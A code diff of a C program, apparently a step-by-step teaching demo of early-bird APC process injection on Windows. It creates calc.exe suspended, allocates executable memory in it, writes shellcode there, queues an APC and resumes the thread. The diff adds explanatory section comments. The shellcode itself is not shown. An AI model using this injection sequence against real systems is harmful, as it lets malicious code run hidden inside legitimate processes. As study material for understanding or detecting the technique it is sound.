@@ -42,7 +42,8 @@ int main() {
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 
-	printf("%s To start we will create the process on suspended state\n", k);
+  // - Section 1: Start the process at suspended state
+  printf("%s To start we will create the process on suspended state\n", k);
 	system("pause");
 	CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	HANDLE victimProcess = pi.hProcess;
@@ -50,22 +51,26 @@ int main() {
 
 	printf("%s PID %ld\n", k, pi.dwProcessId);
 
-	printf("%s Now we will allocate memory on our created process\n", k);
+	// - Section 2: Alocate memory space
+  printf("%s Now we will allocate memory on our created process\n", k);
 	system("pause");
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
 	system("pause");
-	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
-	printf("%s Now we will write our APC containing the shellcode on the memory space that we allocated\n", k);
+	// - Section 3: Write memory space
+  printf("%s Now we will write our APC containing the shellcode on the memory space that we allocated\n", k);
 	system("pause");
 	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
 
-	printf("%s We will queue our APC to the thread\n", k);
+	// - Section 4: Queue the shellcode in the APC Queue of the main thread
+  printf("%s We will queue our APC to the thread\n", k);
 	system("pause");
+  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
-	printf("%s Finally, we will resume the suspended thread, which will thrigger the APC, executing our shellcode\n", k);
+	// - Section 5: Resume the thread
+  printf("%s Finally, we will resume the suspended thread, which will thrigger the APC, executing our shellcode\n", k);
 	system("pause");
 	ResumeThread(threadHandle);
 
